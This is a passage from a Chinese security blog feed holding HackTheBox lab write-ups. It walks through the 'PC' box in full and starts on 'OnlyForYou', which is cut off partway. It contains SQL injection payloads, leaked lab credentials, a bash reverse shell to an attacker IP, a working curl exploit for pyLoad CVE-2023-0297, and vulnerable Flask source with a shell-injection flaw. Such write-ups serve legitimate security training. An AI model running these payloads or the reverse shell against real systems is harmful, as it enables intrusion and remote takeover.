<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230828150233362.png" style="zoom: 80%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>API泄露</tag>
        <tag>API越权</tag>
        <tag>命令执行</tag>
        <tag>CVE-2023-0386（OverlayFS提权）</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-PC</title>
    <url>/posts/cbbc48d2.html</url>
    <content><![CDATA[<h1 id="HTB-PC"><a href="#HTB-PC" class="headerlink" title="HTB-PC"></a>HTB-PC</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.端口扫描发现<code>gRPC</code>服务；</p>
<p>2.<code>gRPC</code>存在SQL注入获取到SSH账户；</p>
<p>3.SSH连接查看主机端口服务发现pyLoad服务；</p>
<p>4.pyLoad服务存在RCE（CVE-2023-0297）反弹shell获取root权限。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.11.214<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911090358901.png"></p>
<p>非常规端口50051，直接浏览器访问是乱码，google发现是gRPC默认端口</p>
<p>google关键字：gRPC exploit</p>
<p><a href="https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9">https://medium.com/@ibm_ptc_security/grpc-security-series-part-3-c92f3b687dd9</a></p>
<p>文章大致意思是，有一个SQL注入</p>
<p>工具：</p>
<p>grpcurl：<a href="https://github.com/fullstorydev/grpcurl">https://github.com/fullstorydev/grpcurl</a></p>
<p>grpcui：<a href="https://github.com/fullstorydev/grpcui">https://github.com/fullstorydev/grpcui</a></p>
<p>用grpcurl可以查看一些基本服务，SimpleApp对应有LoginUser、RegisterUser、getInfo三个接口方法</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911144549961.png"></p>
<p>用grpcui工具，执行如下命令，实现与gRPC服务交互</p>
<pre class="line-numbers language-none"><code class="language-none">./grpcui -plaintext 10.10.11.214:50051<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911094910083.png"></p>
<p>自动打开如下web页面，然后打开Burpsuite，捕获下面的操作过程，方便测试SQL注入</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911094929531.png" style="zoom: 80%;">

<p>在LoginUser接口，弱口令<code>admin:admin</code>成功认证（下面的认证路径是通过观察响应的message，尝试出来的正确认证过程）</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101136655.png" style="zoom:67%;">

<p>得到一个<code>id</code>和<code>token</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101234993.png"></p>
<pre class="line-numbers language-none"><code class="language-none">525
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2OTQ0MDgzMjB9.SH7DanchqAh3QMbI2q8VTH9X1qKX438MtNA8Ixr9TNU<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后到getInfo接口，<code>Request Metadata</code>填入对应的token键值对，<code>Request Data</code>填入id值</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101448304.png" style="zoom:67%;">

<p>点击<code>Invoke</code>之后，响应也是成功的响应</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101534641.png" style="zoom:67%;">

<h2 id="三、gRPC-SQL注入"><a href="#三、gRPC-SQL注入" class="headerlink" title="三、gRPC SQL注入"></a>三、gRPC SQL注入</h2><p>在最后getInfo的数据包中，id部分可能存在注入，因为加单引号会有报错提示</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911101722079.png"></p>
<p>把请求包保存为sqltest文件，sqlmap注入，笔者此处sqlmap跑不出，手工可以注出数据</p>
<pre class="line-numbers language-none"><code class="language-none">sqlmap -r sqltest -p id -f --batch --dump-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113458186.png"></p>
<p>手工（注意union前id改为一个错误id）：</p>
<pre class="line-numbers language-none"><code class="language-none">"id":"520 union select sqlite_version(); --+"
#表名，数据库名
"id":"520 union select group_concat(sql) from sqlite_master --+"
#username的值
"id":"520 union select group_concat(username) from accounts --+"
#password
"id":"520 union select group_concat(password) from accounts --+"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113618817.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911113722594.png"></p>
<p>新找到一个用户</p>
<pre class="line-numbers language-none"><code class="language-none">sau : HereIsYourPassWord1431<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>SSH连接</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911131423418.png"></p>
<p><code>netstat -antp</code>查看端口开放情况，有9666端口是开放的，但访问不到，那就尝试把对内开放的8000端口做端口转发</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911132149615.png"></p>
<p><strong>从本地下载chisel</strong></p>
<p>本地kali执行</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>目标靶机执行</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.10.14.8/chisel
chmod +x chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>建立端口转发</strong></p>
<p>本地kali执行</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel server --port 9898 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135711025.png"></p>
<p>目标靶机执行</p>
<pre class="line-numbers language-none"><code class="language-none">./chisel client -v 10.10.14.8:9898 R:8000:127.0.0.1:8000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135819475.png"></p>
<p>本地浏览器访问<code>127.0.0.1:8000</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911135858947.png" style="zoom:67%;">

<h2 id="四、pyLoad-RCE（CVE-2023-0297）"><a href="#四、pyLoad-RCE（CVE-2023-0297）" class="headerlink" title="四、pyLoad RCE（CVE-2023-0297）"></a>四、pyLoad RCE（CVE-2023-0297）</h2><p>google关键词：pyload exploit</p>
<p><a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad</a></p>
<p>在目标靶机<code>/tmp</code>目录下新建一个<code>shell.sh</code>，写入如下反弹shell脚本</p>
<pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.10.14.8/9899 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地kali开启监听<code>nc -lvnp 9899</code></p>
<p>靶机执行如下命令</p>
<pre class="line-numbers language-none"><code class="language-none">curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/shell.sh\");f=function%20f2(){};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911142716278.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230911143053192.png" style="zoom:67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>gRPC服务</tag>
        <tag>CVE-2023-0297（pyLoad服务RCE）</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-OnlyForYou</title>
    <url>/posts/5cae8651.html</url>
    <content><![CDATA[<h1 id="HTB-OnlyForYou"><a href="#HTB-OnlyForYou" class="headerlink" title="HTB-OnlyForYou"></a>HTB-OnlyForYou</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><p>1.信息收集找到域名和子域；</p>
<p>2.子域源码审计路由发现LFI；</p>
<p>3.LFI读取Nginx配置文件及主站源码；</p>
<p>4.主站源码审计发现RCE；</p>
<p>5.RCE反弹shell获取www-data权限；</p>
<p>6.查看端口服务发现Neo4j服务；</p>
<p>7.Neo4j注入获得ssh账户密码；</p>
<p>8.pip download代码执行实现suid提权。</p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫描端口服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829093603726.png"></p>
<p>发现域名，写入本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.210 only4you.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器打开，首页如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829102935229.png" style="zoom: 67%;">

<p>扫描子域</p>
<pre class="line-numbers language-none"><code class="language-none">gobuster vhost -u http://only4you.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829102827329.png"></p>
<p>发现一个子域，添加进本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.10.11.210 beta.only4you.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问子域</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829103600051.png"></p>
<h2 id="三、LFI（本地文件包含）"><a href="#三、LFI（本地文件包含）" class="headerlink" title="三、LFI（本地文件包含）"></a>三、LFI（本地文件包含）</h2><p>点击<code>Source Code</code>，会下载源码。审计发现<code>app.py</code>的<code>/download</code>路由，if条件用绝对路径即可绕过，POST提交的<code>image</code>参数最终传递给<code>send_file()</code>函数，实现LFI，只需知道文件绝对路径，即可读取任意文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829125830300.png"></p>
<p>nmap扫描结果可看出是Nginx服务，尝试读取Nginx相关配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">Nginx主配置文件默认路径：
/etc/nginx/nginx.conf
虚拟主机默认配置文件：
/etc/nginx/sites-available/default
/etc/nginx/sites-enabled/default<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Burp抓包，POST访问<code>/download</code>目录，提交image参数，然后在虚拟主机配置文件发现web目录是<code>/var/www/only4you.htb/</code>（主站）和<code>/var/www/beta.only4you.htb/</code>（子域）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829130645516.png"></p>
<p>子域下源码有<code>app.py</code>，以经验来看，通常主站下应该也有<code>app.py</code>，尝试读取确实存在</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/only4you.htb/app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230829130958523.png"></p>
<p>完整代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> flash<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> form <span class="token keyword">import</span> sendmessage
<span class="token keyword">import</span> uuid

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
        subject <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'subject'</span><span class="token punctuation">]</span>
        message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span>
        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr

        status <span class="token operator">=</span> sendmessage<span class="token punctuation">(</span>email<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Something went wrong!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'You are not authorized!'</span><span class="token punctuation">,</span> <span class="token string">'danger'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            flash<span class="token punctuation">(</span><span class="token string">'Your message was successfuly sent! We will reply as soon as possible.'</span><span class="token punctuation">,</span> <span class="token string">'success'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/#contact'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">page_not_found</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'404.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">404</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">server_errorerror</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'500.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">bad_request</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'400.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">405</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">method_not_allowed</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'405.html'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">405</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面代码第二行从form模块导入了sendmessage方法，form不是python官方模块，所以猜测在同目录下有<code>form.py</code>，读取如下文件确实存在</p>
<pre class="line-numbers language-none"><code class="language-none">/var/www/only4you.htb/form.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>完整代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> smtplib<span class="token punctuation">,</span> re
<span class="token keyword">from</span> email<span class="token punctuation">.</span>message <span class="token keyword">import</span> EmailMessage
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> PIPE<span class="token punctuation">,</span> run
<span class="token keyword">import</span> ipaddress

<span class="token keyword">def</span> <span class="token function">issecure</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> <span class="token number">0</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		domain <span class="token operator">=</span> email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
		result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
		output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token string">"v=spf1"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
			<span class="token keyword">return</span> <span class="token number">1</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
			ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
			<span class="token keyword">if</span> <span class="token string">"include:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
				dms <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"include:.*\.[A-Z|a-z]{2,}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"include:"</span><span class="token punctuation">)</span>
				dms<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
				<span class="token keyword">for</span> domain <span class="token keyword">in</span> dms<span class="token punctuation">:</span>
					domains<span class="token punctuation">.</span>append<span class="token punctuation">(</span>domain<span class="token punctuation">)</span>
				<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
					<span class="token keyword">for</span> domain <span class="token keyword">in</span> domains<span class="token punctuation">:</span>
						result <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"dig txt </span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
						output <span class="token operator">=</span> result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
						<span class="token keyword">if</span> <span class="token string">"include:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
							dms <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"include:.*\.[A-Z|a-z]{2,}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"include:"</span><span class="token punctuation">)</span>
							domains<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
							<span class="token keyword">for</span> domain <span class="token keyword">in</span> dms<span class="token punctuation">:</span>
								domains<span class="token punctuation">.</span>append<span class="token punctuation">(</span>domain<span class="token punctuation">)</span>
						<span class="token keyword">elif</span> <span class="token string">"ip4:"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
							ipaddresses <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ip4:"</span><span class="token punctuation">)</span>
							ipaddresses<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
							<span class="token keyword">for</span> i <span class="token keyword">in</span> ipaddresses<span class="token punctuation">:</span>
								ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
						<span class="token keyword">else</span><span class="token punctuation">:</span>
							<span class="token keyword">pass</span>
					<span class="token keyword">break</span>
			<span class="token keyword">elif</span> <span class="token string">"ip4"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
				ipaddresses <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"ip4:"</span><span class="token punctuation">)</span>
				ipaddresses<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
				<span class="token keyword">for</span> i <span class="token keyword">in</span> ipaddresses<span class="token punctuation">:</span>
					ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">1</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> ips<span class="token punctuation">:</span>
			<span class="token keyword">if</span> ip <span class="token operator">==</span> i<span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">2</span>
			<span class="token keyword">elif</span> ipaddress<span class="token punctuation">.</span>ip_address<span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token keyword">in</span> ipaddress<span class="token punctuation">.</span>ip_network<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">2</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				<span class="token keyword">return</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">sendmessage</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> message<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
	status <span class="token operator">=</span> issecure<span class="token punctuation">(</span>email<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
	<span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
		msg <span class="token operator">=</span> EmailMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>
		msg<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>email<span class="token punctuation">}</span></span><span class="token string">'</span></span>
		msg<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'info@only4you.htb'</span>
		msg<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>subject<span class="token punctuation">}</span></span><span class="token string">'</span></span>
		msg<span class="token punctuation">[</span><span class="token string">'Message'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>message<span class="token punctuation">}</span></span><span class="token string">'</span></span>

		smtp <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span>
		smtp<span class="token punctuation">.</span>send_message<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
		smtp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> status
	<span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> status
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="四、RCE反弹shell"><a href="#四、RCE反弹shell" class="headerlink" title="四、RCE反弹shell"></a>四、RCE反弹shell</h2><p>存在漏洞的代码如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> <span class="token number">0</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
	domain <span class="token operator">=</span> email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
